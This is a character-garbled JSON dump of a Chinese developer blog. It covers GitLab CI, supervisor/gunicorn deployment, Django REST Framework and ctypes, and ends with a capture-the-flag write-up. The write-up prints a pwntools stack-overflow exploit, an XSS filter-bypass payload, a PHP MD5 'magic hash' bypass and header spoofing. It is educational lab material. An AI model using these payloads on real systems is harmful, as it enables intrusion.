æ”¯æŒå¾ˆå¤šç§ç¯å¢ƒæ¡ä»¶åˆ¤æ–­ï¼Œè¯¦ç»†çš„ç”¨æ³•å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚å¦å¤–ï¼Œæˆ‘ä»¬åœ¨ before_scripts ä¸­ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡æ‹¿åˆ°äº†é¡¹ç›®æ‰€å±çš„ç»„ï¼Œä»¥åŠé¡¹ç›®åç§°ã€‚GitLab ä¼šåœ¨è¿è¡Œä»»åŠ¡å‰ï¼Œå‘ç¯å¢ƒä¸­æ³¨å…¥å¾ˆå¤šç¯å¢ƒå˜é‡ï¼Œæ¥è¡¨æ˜è¿è¡Œç¯å¢ƒä»¥åŠä¸Šä¸‹æ–‡ã€‚æ‰€æœ‰çš„ç¯å¢ƒå˜é‡åˆ—è¡¨å¯ä»¥çœ‹æ–‡æ¡£ã€‚ 2.4 éƒ¨ç½²åœ¨éƒ¨ç½²ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ kubectl set image å‘½ä»¤å°†æˆ‘ä»¬åˆšåˆšæ„å»ºçš„é•œåƒå‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒã€‚è¿™ä¸ªä»»åŠ¡ä¸­çš„ when è¡¨ç¤ºè¿è¡Œè¯¥ä»»åŠ¡æ‰€éœ€è¦çš„å¿…è¦æ¡ä»¶ï¼Œå¦‚å‰ä¸€é˜¶æ®µä»»åŠ¡å…¨éƒ¨æˆåŠŸã€‚when: manual è¡¨ç¤ºè¯¥æ“ä½œåªå…è®¸æ‰‹åŠ¨è§¦å‘ã€‚è¯¥å±æ€§å…·æœ‰å››ä¸ªé€‰é¡¹ï¼Œå…·ä½“è¯·è§æ–‡æ¡£ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬åœ¨ .gitlab-ci.yml ä¸­å®šä¹‰äº†ä¸€å¥—å®Œæ•´çš„æµ‹è¯•â†’æ„å»ºâ†’éƒ¨ç½²æµç¨‹ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"ä½¿ç”¨ supervisor åŠ gunicorn éƒ¨ç½² Web åº”ç”¨","slug":"deploy-apps-with-supervisor-and-gunicorn","date":"2017-03-19T09:00:00.000Z","updated":"2018-07-12T00:15:09.045Z","comments":true,"path":"2017/03/deploy-apps-with-supervisor-and-gunicorn/","link":"","permalink":"https://blog.stdioa.com/2017/03/deploy-apps-with-supervisor-and-gunicorn/","excerpt":"å¾ˆä¹…ä¹‹å‰å°±æƒ³å°è¯•ä¸€ä¸‹ç”¨ supervisor éƒ¨ç½² Web åº”ç”¨ï¼Œå‡ ä¸ªæœˆå‰æŠŠ Python åº”ç”¨çš„æœåŠ¡å™¨éƒ½æ¢æˆäº† gunicornï¼Œä»Šå¤©ç»ˆäºæŠŠè¿›ç¨‹ç®¡ç†æœåŠ¡æ¢æˆäº† supervisor. çœ‹æˆ‘çš„æ‹–å»¶ç—‡ã€‚","text":"å¾ˆä¹…ä¹‹å‰å°±æƒ³å°è¯•ä¸€ä¸‹ç”¨ supervisor éƒ¨ç½² Web åº”ç”¨ï¼Œå‡ ä¸ªæœˆå‰æŠŠ Python åº”ç”¨çš„æœåŠ¡å™¨éƒ½æ¢æˆäº† gunicornï¼Œä»Šå¤©ç»ˆäºæŠŠè¿›ç¨‹ç®¡ç†æœåŠ¡æ¢æˆäº† supervisor. çœ‹æˆ‘çš„æ‹–å»¶ç—‡ã€‚ 1. å‰è¨€ä¹‹å‰ä¸€ç›´åœ¨ç”¨ tmux æ¥æ‰˜ç®¡å„ç§ Web åº”ç”¨è¿›ç¨‹ï¼Œæ„Ÿè§‰è¿™ç§æƒ³æ³•çœŸçš„å¾ˆè ¢ï¼Œäºæ˜¯ä»Šå¤©æŠŠæ‰˜ç®¡æ–¹å¼æ¢æˆäº†æ›´ä¸“ä¸šçš„ supervisorï¼Œå¹¶ç”¨å®ƒæ‰˜ç®¡äº†ä¸‰ä¸ª Django APPï¼Œä¸€ä¸ª flask APPï¼Œè¿˜æœ‰ä¸€ä¸ª node APP.ç®€å•çœ‹çœ‹ä»Šå¤©è¦ç”¨çš„ä¸œè¥¿ï¼šgunicornï¼Œä¸€ä¸ª Python å®ç°çš„ WSGI æœåŠ¡å™¨ï¼›supervisorï¼Œä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·ã€‚Django, Flask, Node.jsï¼Œä¸å¤šè¯´ã€‚ 2. supervisor å®‰è£…åŠåŸºç¡€é…ç½®pip2 install supervisor å³å¯ã€‚æ³¨æ„ï¼Œsupervisor ä¸æ”¯æŒ Python 3.supervisor æä¾›äº†ä¸€ä¸ªé…ç½®ç”Ÿæˆç¨‹åº echo_supervisord_confï¼Œå¯ä»¥ç”¨å®ƒæ¥ç›´æ¥ç”Ÿæˆä¸€ä¸ªå®ä¾‹é…ç½®æ–‡ä»¶ã€‚ç›´æ¥è¾“å…¥ echo_supervisord_conf &gt; /etc/supervisor/supervisord.confï¼Œå°†é…ç½®å†™å…¥æ–‡ä»¶ã€‚éšåï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¼€å¯ http ç®¡ç†æœåŠ¡ï¼š1234[inet_http_server] ; inet (TCP) server disabled by defaultport = 127.0.0.1:9001 ; (ip_address:port specifier, *:port for all iface)username = stdio ; (default is no username (open server))password = password ; (default is no password (open server))æ·»åŠ é€‰é¡¹ï¼ŒåŒ…å«å­ç›®å½• conf.d ä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼š12[include]files = conf.d/*.conféšåï¼Œä½¿ç”¨ sudo supervisord -c /etc/supervisor/supervisord.confï¼Œå¯åŠ¨ supervisor å®ˆæŠ¤è¿›ç¨‹ã€‚é…ç½®ä¸€ä¸‹ Nginxï¼Œç™»å½•ç®¡ç†é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° supervisor æ­£åœ¨è¿è¡Œï¼Œä¸è¿‡ç°åœ¨è¿˜æ²¡æœ‰é…ç½®ä»»ä½•æœåŠ¡ã€‚åŒç†ï¼Œå¯ä»¥ä½¿ç”¨ supervisorctl ç¨‹åºï¼Œæ¥æŸ¥çœ‹æœåŠ¡è¿è¡ŒçŠ¶æ€ã€‚ 3. æœåŠ¡æ‰˜ç®¡ 3.1 æ‰˜ç®¡ä¸€ä¸ª Django åº”ç”¨è¿›å…¥ conf.d æ–‡ä»¶å¤¹ï¼Œåˆ›å»ºé…ç½®æ–‡ä»¶ï¼ˆå¦‚ baybook.confï¼‰ã€‚1234567891011[program:baybook]command = gunicorn baybook.wsgi -b 127.0.0.1:8002 -n baybook ; è¿è¡Œå‘½ä»¤directory = /home/stdio/websites/baybook ; è¿è¡Œè·¯å¾„user = stdioautostart = trueautorestart = truestartsecs = 5startretries = 3stdout_logfile = /var/log/supervisor/baybook_stdout.logstderr_logfile = /var/log/supervisor/baybook_stderr.logenvironment=DJANGO_SETTINGS_MODULE=\"baybook.settings.production\"å…¶ä¸­ï¼Œenvironment é€‰é¡¹å¯ä»¥é…ç½®è¿è¡Œç¯å¢ƒçš„ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚åœ¨æ­¤å¤„æ›´æ”¹äº† Django çš„é…ç½®æ–‡ä»¶é€‰é¡¹ï¼›startsecs é€‰é¡¹è¡¨ç¤ºæ­£å¸¸å¯åŠ¨æ‰€éœ€çš„æ—¶é—´ï¼Œæ¯”å¦‚ï¼Œå½“ç¨‹åºå·²æŒç»­è¿è¡Œè¶…è¿‡ 5 ç§’æ—¶ï¼Œåˆ™è§†ä¸ºç¨‹åºå¯åŠ¨æˆåŠŸã€‚å…·ä½“çš„é…ç½®é€‰é¡¹å¯ä»¥æŸ¥çœ‹æ–‡æ¡£ã€‚ä¿å­˜æ–‡ä»¶åï¼Œè¿è¡Œ supervisorctl update ä½¿é…ç½®ç”Ÿæ•ˆã€‚éšåå¯ä»¥è¾“å…¥ supervisorctl status æ¥æŸ¥çœ‹é…ç½®çŠ¶æ€ã€‚12$ sudo supervisorctl statusbaybook RUNNING pid 7658, uptime 1:19:55supervisor æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼Œç›´æ¥è¾“å…¥ supervisorctl å³å¯è¿›å…¥ï¼Œéšåå¯ä»¥è¾“å…¥ä¸€ç³»åˆ—å‘½ä»¤ï¼Œå¦‚ start, stop, status, restart æ¥æŸ¥çœ‹å’Œæ§åˆ¶æœåŠ¡è¿è¡ŒçŠ¶æ€ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨ Web ç®¡ç†é¡µé¢ä¸­ï¼ŒæŸ¥çœ‹åŠæ§åˆ¶æœåŠ¡çš„è¿è¡ŒçŠ¶æ€ã€‚ 3.2 æ‰˜ç®¡ Node åº”ç”¨Node å’Œ Django çš„é…ç½®æ–‡ä»¶åŸºæœ¬ç›¸åŒï¼Œä¸è¿‡ï¼Œå› ä¸ºæˆ‘çš„ node åº”ç”¨ çš„å¯åŠ¨é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥æˆ‘æŠŠ startsecs è°ƒé«˜åˆ°äº† 30 ç§’ã€‚ 3.3 æ‰˜ç®¡ Flask åº”ç”¨å› ä¸ºæˆ‘çš„ Flask åº”ç”¨è¿è¡Œåœ¨ virtualenv åˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒä¸­ï¼Œæ‰€ä»¥ command å‘½ä»¤è¦ç¨å¾®æ”¹ä¸€ä¸‹ï¼Œå°† gunicorn å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ”¹ä¸ºè™šæ‹Ÿç¯å¢ƒä¸­çš„ gunicorn ç»å¯¹è·¯å¾„ï¼Œå¦‚ /home/stdio/websites/crypt/venv/bin/gunicorn. 4. åè®°å¥½åƒå¯å†™çš„å°±è¿™ä¹ˆå¤šâ€¦ä»¥åç ”ç©¶ä¸€ä¸‹ gunicornï¼Œå†è¡¥å…… gunicorn çš„ç›¸å…³å†…å®¹å§ã€‚","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.stdioa.com/categories/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"supervisor","slug":"supervisor","permalink":"https://blog.stdioa.com/tags/supervisor/"},{"name":"gunicorn","slug":"gunicorn","permalink":"https://blog.stdioa.com/tags/gunicorn/"}]},{"title":"Django REST Framework å…¥é—¨","slug":"DRF-demo","date":"2017-03-09T06:52:00.000Z","updated":"2018-07-12T11:35:13.401Z","comments":true,"path":"2017/03/DRF-demo/","link":"","permalink":"https://blog.stdioa.com/2017/03/DRF-demo/","excerpt":"æ‹–äº†å¾ˆä¹…ï¼Œç»ˆäºç”¨ Django REST Framework å†™äº†ä¸ªå° Demo.","text":"æ‹–äº†å¾ˆä¹…ï¼Œç»ˆäºç”¨ Django REST Framework å†™äº†ä¸ªå° Demo. 1. Django REST FrameworkDjango REST Framework æ˜¯ä¸€ä¸ªç”¨æ¥æ„é€  Web API çš„ã€å¼ºå¤§è€Œçµæ´»çš„å·¥å…·åŒ…ã€‚æœ€æ—©è®¤è¯†è¿™ä¸ªæ¡†æ¶æ˜¯åœ¨æˆ‘ç¿»è¯‘çš„ã€Š5 ä¸ªæœ€å—äººå–œçˆ±çš„å¼€æº Django åŒ…ã€‹ä¸­ï¼Œè€ŒçœŸæ­£æ¥è§¦å®ƒçš„æ—¶å€™å·²ç»æ˜¯åœ¨äº”ä¸ªæœˆä¹‹åã€‚é‚£ä¸ªæ—¶å€™åœ¨æ‰‡è´å®ä¹ ï¼Œç¬¬ä¸€æ¬¡ä½“ä¼šåˆ°äº†è¿™ä¸ªæ¡†æ¶çš„ç®€å•æ˜“ç”¨ã€‚ä½†é‚£ä¸ªæ—¶å€™ä¹Ÿä»…ä»…æ˜¯åšç å†œå †ä»£ç ï¼Œå¹¶æ²¡æœ‰å¯¹è¿™ä¸ªæ¡†æ¶äº§ç”Ÿç‰¹åˆ«æ·±çš„äº†è§£ã€‚å‰ä¸¤å¤©å†™äº†ä¸€ä¸ªå° Demoï¼Œå°è¯•ç€ç”¨æ¯”è¾ƒå°‘çš„ä»£ç å®ç°å¯¹æŸä¸ªæ¨¡å‹çš„å¢åˆ æ”¹æŸ¥æ“ä½œï¼Œä»Šå¤©ç®€å•æŠŠå®ç°è¿‡ç¨‹è®°å½•ä¸€ä¸‹ã€‚å®Œæ•´çš„ä»£ç åœ¨è¿™é‡Œã€‚ 2. ä¸€ç‚¹å‡†å¤‡å·¥ä½œå…ˆå®‰è£…ä¾èµ–ï¼ˆæ¨èä½¿ç”¨ virtualenvï¼Œè™½ç„¶æˆ‘ä»æ¥ä¸ç”¨ğŸŒšï¼‰ï¼špip install Django djangorestframework.ç„¶ååˆ›å»ºå·¥ç¨‹ï¼Œåˆ›å»º app.123django-admin startproject drf_democd drf_demo./manage.py startapp demoç®€å•å†™ä¸€ä¸ª modelï¼š12345# demo/models.pyfrom django.db import models class Data(models.Model): content = models.CharField(max_length=128)è¿ç§»æ•°æ®åº“ï¼š12./manage.py makemigrations./manage.py migrateåœ¨é¡¹ç›®è®¾ç½®ä¸­æ·»åŠ  APPï¼Œé¡ºä¾¿æŠŠ DRF ä¹Ÿæ·»åŠ è¿›å»ï¼š123456# drf_demo/settings.pyINSTALLED_APPS = [ # ... 'rest_framework', 'demo']åœ¨ root URL conf ä¸­æ·»åŠ  APP çš„ URLï¼š12345# drf_femo/urls.pyurlpatterns = [ # ... url(r'^', include('demo.urls'))] 3. å¼€å§‹åŠ¨æ‰‹å†™ APIå¦‚æœåœ¨ Django ä¸­å†™ä¸€ä¸ªé¡µé¢ï¼Œä½ éœ€è¦ï¼šåœ¨ urls.py ä¸­æ³¨å†Œ viewï¼›åœ¨ views.py ä¸­ç¼–å†™ viewï¼›åœ¨ templates æ–‡ä»¶å¤¹ä¸­ç¼–å†™æ¨¡æ¿ã€‚ç›¸å¯¹åœ°ï¼Œå¦‚æœä½¿ç”¨ DRF åˆ›å»ºä¸€ç»„ APIï¼Œä½ éœ€è¦ï¼šåœ¨ urls.py ä¸­å®šä¹‰å¹¶æ³¨å†Œ routerï¼›åœ¨ views.py ä¸­å®šä¹‰ ViewSetï¼›åœ¨ serializers.py ä¸­å®šä¹‰ serializer. 3.1 åˆ›å»º serializerserializer æ˜¯ä»€ä¹ˆï¼Ÿç®€å•è€Œè¨€ï¼Œserializer å°±æ˜¯ä¸€ç§æ ¹æ®é…ç½®ï¼Œç”¨æ¥æŠŠæ•°æ®åœ¨ model instance åŠ raw data ä¹‹é—´è½¬æ¢çš„å¯¹è±¡ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬å¯ä»¥é’ˆå¯¹åˆšåˆšå®šä¹‰çš„ model Data æ¥åˆ›å»ºä¸€ä¸ª serializer:123456789# demo/serializers.pyfrom .models import Datafrom rest_framework.serializers import ModelSerializer class DataSerializer(ModelSerializer): class Meta: model = Data fields = (\"id\", \"content\")ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ª serializer å°†æ•°æ®åœ¨ Data å¯¹è±¡åŠ JSON æ•°æ®ä¹‹é—´è½¬æ¢ï¼š123456789101112131415161718from demo.serializers import Data, DataSerializerfrom rest_framework.renderers import JSONRenderer # ç”¨äº JSON æ¸²æŸ“åŠè§£æfrom rest_framework.parsers import JSONParserfrom django.utils.six import BytesIO instance = Data(content=\"test\")instance.save() serializer = DataSerializer(instance)JSONRenderer().render(serializer.data) # b'&#123;\"id\":1,\"content\":\"test\"&#125;' raw = b'&#123;\"id\":2,\"content\":\"another\"&#125;'stream = BytesIO(raw) # å°† JSON æ•°æ®å˜æˆ Python dictdata = JSONParser().parse(stream) serializer = DataSerializer(data=data)ins = serializer.save() # &lt;Data: Data object&gt;ins.__dict__ # &#123;'content': 'another', 'id': 2&#125; 3.2 åˆ›å»º ViewSetéå¸¸ç®€å•ï¼Œåœ¨ views.py ä¸­å®šä¹‰ä¸€ä¸ª ViewSet ç±»ï¼Œæ ‡æ˜å¯¹åº”çš„ model ä»¥åŠ serializer å³å¯ï¼š123456789# demo/views.pyfrom rest_framework.viewsets import ModelViewSetfrom .models import Datafrom .serializers import DataSerializer class DataViewSet(ModelViewSet): queryset = Data.objects.all() serializer_class = DataSerializer 3.3 å®šä¹‰ã€é…ç½®å¹¶æ³¨å†Œ router1234567891011# demo/urls.pyfrom django.conf.urls import url, includefrom rest_framework.routers import DefaultRouterfrom .views import DataViewSet router = DefaultRouter() # å®šä¹‰ routerrouter.register('data', DataViewSet) # æ³¨å†Œ viewset urlpatterns = [ url(r'^', include(router.urls)), # åœ¨ urlpatterns é‡ŒåŒ…å« router] 4. å¤§åŠŸå‘Šæˆï¼å¯åŠ¨æœåŠ¡å™¨ï¼Œè®¿é—® /data/ï¼Œä½ å°±ä¼šçœ‹åˆ° DRF ç²¾ç¾çš„è°ƒè¯•ç•Œé¢ï¼ŒçœŸæ˜¯æ„ŸåŠ¨ğŸ˜­æŒ‰ç…§ RESTful API è§„èŒƒï¼Œåœ¨åˆ—è¡¨ç•Œé¢ï¼Œä½ å¯ä»¥é€šè¿‡ POST è¡¨å•æ¥åˆ›å»ºæ–°å¯¹è±¡ï¼šåœ¨è¯¦æƒ…ç•Œé¢ï¼ˆ/data/1/ï¼‰ï¼Œä½ å¯ä»¥é€šè¿‡ PUT è¡¨å•ä¿®æ”¹å¯¹è±¡ï¼Œæˆ–é€šè¿‡ DELETE æŒ‰é’®æ¥åˆ é™¤å¯¹è±¡:å½“ç„¶ï¼Œå¦‚æœä½ ä¹æ„ï¼Œä½¿ç”¨ CURL æ¥è°ƒè¯•ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒæœåŠ¡å™¨ä¼šç»™ä½ è¿”å› JSON è€Œä¸æ˜¯ HTML:12$ curl -XPUT --data \"content=edit\" http://localhost:8000/data/1/&#123;\"id\":1,\"content\":\"edit\"&#125; 5. ç­‰ç­‰â€¦åˆ«å¿˜äº†å†™æµ‹è¯•ï¼DRF æä¾›äº†ä¸€ç³»åˆ—å·¥å…·æ¥ååŠ© RESTful API æµ‹è¯•ï¼Œæ¯”å¦‚ rest_framework.test.APIClient. APIClient åœ¨å‘é€è¯·æ±‚æ—¶ä¼šæ ¹æ®é…ç½®è‡ªåŠ¨è®¾å®š Content-Type, è€Œä¸æ˜¯ç”¨ Django è‡ªå¸¦ djanto.test.Client çš„ application/octet-streamï¼Œæ–¹ä¾¿äº† API æµ‹è¯•ã€‚æµ‹è¯•ä»£ç ä¸åœ¨è¿™é‡Œè´´å‡ºï¼ˆæœ‰äº›æ— è¶£ï¼‰ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥æˆ³æˆ³æˆ³è¿™é‡Œã€‚æ•™ç¨‹ç»“æŸã€‚è¿™ä¸¤å¤©æˆ‘è¿˜ä¼šç»§ç»­çœ‹ DRFï¼Œåé¢è¿˜ä¼šç»§ç»­æ›´æ–°ç›¸å…³å†…å®¹ã€‚æ›´æ–°â€¦ç„¶è€Œå¹¶æ²¡æœ‰æ›´æ–°ã€‚æˆ‘çœ‹å®Œäº† DRF çš„ tutorialï¼Œä¹Ÿåœ¨æŸä¸ªé¡¹ç›®é‡Œç¢°åˆ°äº†å‘/éš¾ç”¨çš„åœ°æ–¹ï¼Œä¸è¿‡è¿™äº›éƒ½æ²¡æœ‰å¤ªå¤šå¯å†™çš„åœ°æ–¹ï¼Œæ‰€ä»¥å°±ç®—äº†å§ï¼Œé‡åˆ°é—®é¢˜ç¿»æ–‡æ¡£å°±å¥½ï¼ŒDRF çš„æ–‡æ¡£å†™çš„è¿˜æ˜¯æŒºä¸é”™çš„ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"Django REST Framework","slug":"Django-REST-Framework","permalink":"https://blog.stdioa.com/tags/Django-REST-Framework/"}]},{"title":"Python å­¦ä¹ ä¹‹ ctypes","slug":"learning-python-ctypes","date":"2016-12-30T03:27:00.000Z","updated":"2018-07-12T00:14:49.653Z","comments":true,"path":"2016/12/learning-python-ctypes/","link":"","permalink":"https://blog.stdioa.com/2016/12/learning-python-ctypes/","excerpt":"è¯¾è®¾å†™ä¸å®Œï¼Œè¦ç‚¸äº†â€¦ Windows UI å¥½éš¾å†™ï¼Œåªå¥½ç”¨ PyQt è§£å†³â€¦ æ€ä¹ˆæŠŠ Python å’Œ C æ¨¡å—è¿èµ·æ¥ï¼Ÿå°±ç”¨ ctypes.","text":"è¯¾è®¾å†™ä¸å®Œï¼Œè¦ç‚¸äº†â€¦ Windows UI å¥½éš¾å†™ï¼Œåªå¥½ç”¨ PyQt è§£å†³â€¦ æ€ä¹ˆæŠŠ Python å’Œ C æ¨¡å—è¿èµ·æ¥ï¼Ÿå°±ç”¨ ctypes. 1. ç®€ä»‹ctypes æ˜¯ä¸€ä¸ª Python å¤–éƒ¨åº“ã€‚å®ƒæä¾› C è¯­è¨€å…¼å®¹çš„æ•°æ®ç»“æ„ï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨ DLL æˆ–å…±äº«åº“(shared library)çš„å‡½æ•°ã€‚ 2. å¿«é€Ÿä¸Šæ‰‹ç¼–å†™ mod.c:12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; int add(int a, int b)&#123; return a+b;&#125; char *hello(char *name)&#123; char *str; str = (char *)malloc(100); sprintf(str, \"Hello, %s\", name); return str;&#125;å°† C ç¨‹åºç¼–è¯‘ä¸ºå…±äº«åº“ï¼šgcc -fPIC -shared mod.c -o mod.soç¼–å†™ Python ä»£ç ï¼š1234567891011121314# coding: utf-8from ctypes import * mod = CDLL(\"./mod.so\") print(mod.add(1, 2)) # 3 hello = mod.hellohello.restype = c_char_p # Set response type, # otherwise an address(integer) will be returned world = create_string_buffer(b\"World\")res = hello(byref(world)) # Pass by pointerprint(res)å®Œã€‚å‰©ä¸‹çš„ç­‰å†™å®Œè¯¾è®¾å†æ›´ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"ctypes","slug":"ctypes","permalink":"https://blog.stdioa.com/tags/ctypes/"}]},{"title":"SUCTF éå®˜æ–¹ Writeup","slug":"SuCTF-Writeup","date":"2016-11-15T11:23:58.000Z","updated":"2018-07-12T11:35:13.405Z","comments":true,"path":"2016/11/SuCTF-Writeup/","link":"","permalink":"https://blog.stdioa.com/2016/11/SuCTF-Writeup/","excerpt":"åˆç©äº†ä¸€åœº CTFï¼Œè™½ç„¶æ˜¯ä¸ªäººèµ›ï¼Œä½†æ˜¯æœ‰è€å¸æœºå¸¦æˆ‘é£ã€‚ç»§ç»­å¼€è„‘æ´ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ï¼Œåšäº†å¾ˆå¤šä¹‹å‰æ²¡åšè¿‡çš„é¢˜ã€‚","text":"åˆç©äº†ä¸€åœº CTFï¼Œè™½ç„¶æ˜¯ä¸ªäººèµ›ï¼Œä½†æ˜¯æœ‰è€å¸æœºå¸¦æˆ‘é£ã€‚ç»§ç»­å¼€è„‘æ´ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ï¼Œåšäº†å¾ˆå¤šä¹‹å‰æ²¡åšè¿‡çš„é¢˜ã€‚ PWN è¿™æ˜¯ä½  hello pwnï¼Ÿæ–‡ä»¶åœ¨è¿™é‡Œã€‚åç¼–è¯‘å¾—åˆ° main å’Œ getflag å‡½æ•°ï¼š12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); write(1, \"let's begin!\\n\", 0xDu); read(0, &amp;v4, 0x100u); return 0;&#125; //----- (0804865D) --------------------------------------------------------int getflag()&#123; char format; // [sp+14h] [bp-84h]@4 char s1; // [sp+28h] [bp-70h]@3 FILE *v3; // [sp+8Ch] [bp-Ch]@1 v3 = fopen(\"flag.txt\", \"r\"); if ( !v3 ) exit(0); printf(\"the flag is :\"); puts(\"SUCTF&#123;dsjwnhfwidsfmsainewmnci&#125;\"); puts(\"now,this chengxu wil tuichu.........\"); printf(\"pwn100@test-vm-x86:$\"); __isoc99_scanf(\"%s\", &amp;s1); if ( strcmp(&amp;s1, \"zhimakaimen\") ) exit(0); __isoc99_fscanf(v3, \"%s\", &amp;format); return printf(&amp;format);&#125;å¯ä»¥çœ‹å‡ºè¿™ä¸ªé¢˜éœ€è¦è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ä¸»å‡½æ•°çš„è¿”å›åœ°å€å˜ä¸º 0x0804865D, è·³è‡³ getflag å‡½æ•°, ç„¶åè¾“å…¥ â€œzhimakaimenâ€ å¾—åˆ° flag. ç¼–å†™ payloadï¼š123456from pwn import * r = remote('xxx.xxx.xxx.xxx', 10000)r.send('A' * 112 + '\\x5d\\x86\\x04\\x08')r.interactive()æœ€åå¾—åˆ° flag: SUCTF{5tack0verTlow_!S_s0_e4sy}.ç®€å•çš„æ ˆæº¢å‡ºæ”»å‡»ï¼Œæˆ‘åšçš„ç¬¬ä¸€é“ PWN é¢˜ã€‚ä¸€å¼€å§‹ä¸çŸ¥é“ pwntool, ç”¨ socket å†™äº†ä¸€å¤§å †ä»£ç ï¼Œç®€ç›´é†‰äººã€‚ Web flag åœ¨å“ªï¼Ÿåœ¨ Cookie é‡Œã€‚HTTP å“åº”å¤´å¸¦æœ‰ Cookie: flag=suctf%7BThi5_i5_a_baby_w3b%7D å­—æ®µã€‚ ç¼–ç éƒ½è¯´äº†æ˜¯ç¼–ç ï¼Œæ‰¾å§ã€‚HTTP å“åº”å¤´éƒ¨æœ‰ Password: VmxST1ZtVlZNVFpVVkRBOQ==ï¼Œbase64 è§£ç ä¸‰æ¬¡å¾—å‡º Su233ï¼Œæäº¤è‡³ç½‘é¡µå¾—åˆ° flag. ç„¶è€Œç½‘é¡µä¸Šçš„æäº¤æŒ‰é’®æ˜¯å‡çš„ğŸ˜‚å¥½å§ï¼Œåæ­£è¡¨å• method æ˜¯ GETï¼Œä» URL é‡Œè¾“è¿›å»å°±è¡Œäº†ã€‚æœ€åå¾—åˆ° flag: suctf{Su_is_23333} XSS1XSS è¿‡æ»¤äº† &lt;script&gt; æ ‡ç­¾ã€‚è¯•è¯• img å§ã€‚æäº¤ Payload &lt;img src=# onerror=alert(1)&gt;ï¼Œå¾—åˆ° flag suctf{too_eaSy_Xss}. PHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ç½‘é¡µå†…å®¹ä¸ºç©ºï¼ŒæŸ¥çœ‹æºç å¾—åˆ° php:1234if(isset($_GET[\"password\"]) &amp;&amp; md5($_GET[\"password\"]) == \"0\") echo file_get_contents(\"/opt/flag.txt\");else echo file_get_contents(\"xedni.php\");MD5 == &quot;0&quot;ï¼Œä»¥å‰åšè¿‡è¿™é“é¢˜ï¼Œæ‰¾ä¸ª MD5 å¼€å¤´æ˜¯ 0e çš„å­—ç¬¦ä¸²å°±è¡Œäº†ï¼Œæ¯”å¦‚ s878926199aã€‚æäº¤å¾—åˆ° flag: suctf{PHP_!s_the_bEst_1anguage}.å°¼ç›ï¼Œå­—ç¬¦ä¸²å½“æ•°å­—æ¯”ï¼ŒPHP çœŸæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å•Šã€‚ ( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯ç»™äº†ä¸€é•¿ä¸²é¢œæ–‡å­—ï¼Œè·‘ä¸ªæ§åˆ¶å°å§ï¼Œç«Ÿç„¶ alert å‡ºä¸€æ®µ Brainfuck ğŸŒšå¥½å§ï¼Œæ‰¾ä¸ª AAEncode è§£ç å™¨ï¼ŒæŠŠæ··æ·†ä¹‹å‰çš„ä»£ç è§£å‡ºæ¥å°±è¡Œäº†ï¼Œç„¶åæ‰¾ä¸ª Brainfuck è§£é‡Šå™¨è·‘ä¸€ä¸‹ï¼Œå¾—åˆ° flag: suctf{aAenc0de_and_bra1nf**k}. ä½ æ˜¯è°ï¼Ÿä½ ä»å“ªé‡Œæ¥ï¼Ÿä»¥å‰åšè¿‡äº†ï¼Œæ”¹ HTTP è¯·æ±‚å¤´éƒ¨çš„ Origin å’Œ X-Forwarded-For å­—æ®µå³å¯ã€‚å¾—åˆ° flag: suctf{C0ndrulation!_y0u_f1n1shed}. XSS2çœ‹äº†åˆ«äººçš„ Writeupï¼Œéº»è›‹è¿™ç«Ÿç„¶æ˜¯é“éšå†™ï¼ŸæŠŠ URL ä¸­çš„ xss2.php å»æ‰ç«Ÿç„¶èƒ½æŠŠç›®å½•åˆ—å‡ºæ¥â€¦é‡Œé¢æœ‰ä¸ª TIFF 